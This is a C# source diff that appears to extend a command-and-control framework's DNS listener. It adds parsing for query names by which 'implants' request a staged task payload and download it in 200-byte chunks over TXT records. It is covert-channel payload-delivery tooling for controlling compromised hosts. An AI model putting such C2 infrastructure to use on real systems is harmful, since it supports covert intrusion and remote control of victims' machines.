@@ -28,6 +28,18 @@ namespace Rod.Transport.Listeners.Dns;
 //   the probe confirms its blob landed (first-wins makes the re-send
 //   idempotent).
 //
+//   staged demand (pull a staged task's payload from a byte offset,
+//   ADR-010): the offset is decimal, the prefix proof is the b32 of the
+//   held bytes' SHA-256 (the bare label 'e' on a fresh demand), and the
+//   answer is "=<b32 token>" naming a chunked download:
+//     s.<b32(task id)>.<offset>.<b32(sha256) | e>.<b32(implant id)>.<zone>
+//
+//   staged download chunk (the token-keyed answer, the a.-probe shape):
+//     d.<b32(token)>.<seq>.<zone>
+//   answered "<t|m>.<b32(chunk)>" -- the chunk seals as a raw R1 body under
+//   the staged tag for a key-bound implant; the sequence indexes 200-byte
+//   slices from the honored seam.
+//
 // A poll is answered with zero or one TXT record whose strings concatenate to
 // the base32 of a signed rod.v1 TaskRequest; a result is answered with an
 // empty NOERROR answer. The chunk sequence is 0-origin decimal; the terminal
@@ -88,6 +100,19 @@ internal static class DnsContactNames
 
     /// <summary>One probe of an enrollment answer: a token, a chunk index.</summary>
     internal sealed record EnrollAnswerProbe(byte[] Token, int Sequence);
+
+    /// <summary>
+    /// One demand for a staged task's payload (ADR-010): the byte offset the
+    /// demanding implant holds, with its SHA-256 prefix proof -- null on a
+    /// fresh demand.
+    /// </summary>
+    internal sealed record StagedDemand(ImplantId Implant, TaskId Task, long Offset, byte[]? PrefixSha);
+
+    /// <summary>
+    /// One probe of a staged download: the token the demand's answer named,
+    /// and the chunk index within it.
+    /// </summary>
+    internal sealed record StagedDownloadProbe(byte[] Token, int Sequence);
 
     /// <summary>
     /// One delivery probe: the task the sender reported to, and the first 16
@@ -268,6 +293,49 @@ internal static class DnsContactNames
     }
 
     /// <summary>
+    /// Parses a staged-payload demand against <paramref name="zone"/>:
+    /// s.&lt;task&gt;.&lt;offset&gt;.&lt;b32(sha256) | e&gt;.&lt;implant&gt;.
+    /// The offset is decimal; the proof label 'e' names a fresh demand.
+    /// </summary>
+    public static StagedDemand? TryParseStaged(string name, string zone)
+    {
+        if (!TryStripZone(name, zone, out var labels))
+            return null;
+        if (labels.Length != 5 || labels[0] != "s")
+            return null;
+        if (!TryDecodeId(labels[4], out var implant))
+            return null;
+        if (!TryDecode(labels[1], out var taskBytes)
+            || !TaskId.TryParse(System.Text.Encoding.UTF8.GetString(taskBytes), out var task))
+            return null;
+        if (!long.TryParse(labels[2], out var offset) || offset < 0)
+            return null;
+        var proof = labels[3] == "e"
+            ? null
+            : TryDecode(labels[3], out var decoded) ? decoded : null;
+        if (proof is not null && proof.Length != 32)
+            return null;
+        return new StagedDemand(implant, task, offset, proof);
+    }
+
+    /// <summary>
+    /// Parses a staged-download probe against <paramref name="zone"/>:
+    /// d.&lt;token&gt;.&lt;seq&gt;.
+    /// </summary>
+    public static StagedDownloadProbe? TryParseStagedDownload(string name, string zone)
+    {
+        if (!TryStripZone(name, zone, out var labels))
+            return null;
+        if (labels.Length != 3 || labels[0] != "d")
+            return null;
+        if (!TryDecode(labels[1], out var token) || token.Length == 0)
+            return null;
+        if (!int.TryParse(labels[2], out var sequence) || sequence < 0)
+            return null;
+        return new StagedDownloadProbe(token, sequence);
+    }
+
+    /// <summary>
     /// Parses a delivery probe against <paramref name="zone"/>:
     /// n.&lt;b32(task id)&gt;.&lt;b32(sha128)&gt;.&lt;b32(implant id)&gt;.
     /// </summary>
@@ -313,7 +381,7 @@ internal static class DnsContactNames
         if (head.Length == 0)
             return false;
         labels = head.Split('.');
-        return labels.Length > 0 && labels[0] is "p" or "k" or "r" or "c" or "e" or "a" or "n";
+        return labels.Length > 0 && labels[0] is "p" or "k" or "r" or "c" or "e" or "a" or "n" or "s" or "d";
     }
 
     private static bool TryDecodeId(string label, out ImplantId implant)
